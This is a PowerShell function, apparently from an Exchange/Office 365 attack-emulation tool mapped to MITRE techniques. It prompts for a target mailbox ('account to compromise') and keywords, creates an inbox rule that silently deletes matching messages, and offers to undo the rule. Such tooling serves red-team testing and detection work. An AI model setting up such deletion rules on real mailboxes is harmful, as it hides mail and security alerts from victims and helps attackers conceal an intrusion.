function MailboxDeleteRuleSetup {	
    mitre_details("MailboxDeleteRuleSetup")

    EnterMailbox("Enter a mailbox address to setup mail deletion rule on")

    #Enter account to compromise
    $target_mailbox = $global:input_mailbox_address
    $InboxRuleName = Read-Host -Prompt "Enter a name for the mailbox rule you want to create"
    Write-Host "`nConfiguring mailbox rule to delete emails from $target_mailbox mailbox containing specific terms" @fg_gray

    #Take keywords for the mailbox rule
    do {
        $input_rule_keywords = Read-Host -Prompt "Enter a term or multiple terms separated by comma(,) to include in the mailbox rule"

        if ($input_rule_keywords -eq $null) {
            Write-Host "Its not like giving a compliment. I am sure you can come up with a few words ;)" @fg_red
        }
    } while (
        $input_rule_keywords -eq $null
    )
    
    $rule_keywords = $input_rule_keywords.Split(",").TrimStart()
    
    #Setup Inbox Rules
    try {
        Write-Host "`nCreating mailbox rule to delete messages with keywords matching: $rule_keywords"
        New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords $rule_keywords -Mailbox $target_mailbox -Confirm:$false -ErrorAction Stop
        Start-Sleep -s 5

        #Confirm rule setup
        Get-InboxRule -Mailbox $target_mailbox
        Write-Host "`nNew mailbox rule has been deployed successfully!!!" @fg_yellow @bg_black
        $allow_undo = $true
    }
    catch {
        Write-Host "`nError: Failed to create the mailbox rule!"
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $cleanup = Read-Host -Prompt "`nWould you like to remove the mailbox rule created (Yes/No)"

        if ($cleanup -notin "No","no","N","n"){

            try {
                Write-Host "`nRemoving the new mailbox rules created..."
                Remove-InboxRule -Mailbox $target_mailbox -Identity $InboxRuleName -Confirm:$false -ErrorAction Stop
                Write-Host "`nUndo successful: Removed mailbox rule: $InboxRuleName" @fg_yellow @bg_black
            }
            catch {
                Write-Host "`nError: Failed to delete mailbox rule $InboxRuleName!`n You can try to delete it manually from the Admin console."
            }
        }

        else {
            #DoNothing
        }
    }
    Pause
}